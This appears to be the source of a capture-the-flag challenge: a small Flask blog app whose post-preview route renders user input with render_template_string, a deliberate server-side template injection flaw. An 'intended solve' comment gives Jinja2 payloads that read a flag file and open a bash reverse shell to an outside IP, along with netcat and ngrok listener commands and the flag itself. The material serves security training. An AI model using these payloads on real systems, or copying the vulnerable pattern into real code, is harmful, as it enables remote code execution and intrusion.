#!/usr/bin/env python3

import requests
from flask import Flask, request, abort, render_template_string
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import sqlite3

app = Flask(__name__)
limiter = Limiter(app, key_func=get_remote_address)

newpost = '''
<h2>Create A New Post</h2>
<p>This page is under development. Currently only you will be able to preview the post.</p>
<form action="/submit" name="postForm" method="post">
    <textarea id="confirmationText" class="text" cols="86" rows ="20" name="postForm"></textarea>
    <br>
    <input type="submit" value="Preview Post" >
</form>
'''

mainpage = '''
<h2>Main Page</h2>
<p>Welcome to our site! Currently we're using this framework called Flask that uses a template engine called Jinja2!</p>
<a href="/newpost">Make a new post</a> 
'''

# INTENDED SOLVE
# ./ngrok tcp 8080
# nc -lnvp 8080
# {{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /home/flag.txt')['read']() }}
# Listening on 0.0.0.0 8080
# Connection received on 127.0.0.1 42962
# sectalks{!!!the-template-of-ex3cution}
# {{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('/bin/bash -c "/bin/bash -i >& /dev/tcp/147.182.205.110/44777 0>&1"')['read']() }}

@app.route('/')
def indexpage():
  return mainpage
  
@app.route('/newpost')
def newpostpage():
  return newpost

@app.route('/submit', methods=['POST'])
@limiter.limit("10/minute") 
def submitpage():
    try:
        message = request.form['postForm']
        template = '''message preview: {}'''.format(message)
        return render_template_string(message)
    except:
        return 'Error!'

app.run(host='0.0.0.0', port=5004, threaded=True)








